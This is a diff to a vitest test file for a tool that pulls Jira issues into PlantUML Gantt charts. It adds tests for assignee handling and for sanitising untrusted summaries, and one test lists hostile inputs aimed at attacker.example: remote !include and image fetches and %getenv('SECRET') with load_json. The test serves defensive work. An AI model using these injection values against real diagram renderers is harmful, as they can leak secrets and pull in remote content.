@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { parseGantt } from "@plantuml-studio/diagram-gantt";
-import { buildJiraPullPlan, summarizeJiraPullPlan } from "./pull";
+import { buildJiraPullPlan, jiraTaskLabel, summarizeJiraPullPlan } from "./pull";
 
 const issue = {
   id: "10042",
@@ -155,5 +155,67 @@ describe("buildJiraPullPlan", () => {
       unchanged: 0,
       warnings: 0,
     });
+  });
+
+  it("keeps locally edited resources when refreshing the assignee", () => {
+    const source = `@startgantt
+[Implement (SSO)] as [jira_10042] on {Ada:50%} {Grace:50%} starts 2026-09-01
+[jira_10042] ends 2026-09-12
+@endgantt`;
+    const result = buildJiraPullPlan(source, "https://acme.atlassian.net", [issue], { includeAssignee: true });
+    expect(result.source).toContain("{Ada:50%} {Grace:50%}");
+    expect(result.source).not.toContain("{Ada:100%}");
+  });
+
+  it("updates a Jira-managed single assignee", () => {
+    const source = `@startgantt
+[Implement (SSO)] as [jira_10042] on {Linus:100%} starts 2026-09-01
+[jira_10042] ends 2026-09-12
+@endgantt`;
+    const result = buildJiraPullPlan(source, "https://acme.atlassian.net", [issue], { includeAssignee: true });
+    expect(result.source).toContain("{Ada:100%}");
+    expect(result.source).not.toContain("Linus");
+  });
+
+  it("neutralizes PlantUML syntax in untrusted Jira summaries and assignees", () => {
+    const hostile = [
+      "<img:https://attacker.example/p.png> Fix login",
+      '%getenv("SECRET") and % load_json("https://attacker.example")',
+      "<U+0021>include <&lock> [[https://attacker.example link]]",
+      "!include https://attacker.example/x.puml",
+      "/' hidden '/ Ship\u2028it",
+    ];
+    const result = buildJiraPullPlan(
+      "@startgantt\n@endgantt",
+      "https://acme.atlassian.net",
+      hostile.map((summary, index) => ({
+        ...issue,
+        id: String(20000 + index),
+        key: `APP-${200 + index}`,
+        summary,
+        assignee: { accountId: `a${index}`, displayName: index === 0 ? "<img:https://attacker.example>" : "Ada" },
+      })),
+      { includeAssignee: true },
+    );
+    const taskLines = result.source.split("\n").filter((line) => line.includes(" as [jira_"));
+    expect(taskLines).toHaveLength(hostile.length);
+    for (const line of taskLines) {
+      const label = /^\[([^\]]*)\] as /.exec(line)?.[1];
+      expect(label).toBeDefined();
+      expect(label).not.toMatch(/[<>%[\]\u2028]|\/'|^!/);
+    }
+    expect(result.source).not.toContain("attacker.example>");
+    expect(result.source).not.toContain("<img:");
+    expect(result.source).not.toMatch(/^\s*!/m);
+    expect(result.source).not.toMatch(/%\s*(?:getenv|load_json)/i);
+    expect(taskLines[0]).not.toContain(" on {");
+    expect(parseGantt(result.source).diagnostics).toEqual([]);
+  });
+
+  it("keeps ordinary summaries readable", () => {
+    expect(jiraTaskLabel("Implement [SSO]")).toBe("Implement (SSO)");
+    expect(jiraTaskLabel("Ship 100% of <v2> scope")).toBe("Ship 100\uff05 of \u2039v2\u203a scope");
+    expect(jiraTaskLabel("!Urgent: fix\r\nlogin\tflow")).toBe("\u01c3Urgent: fix login flow");
+    expect(jiraTaskLabel("x".repeat(400))).toHaveLength(255);
   });
 });
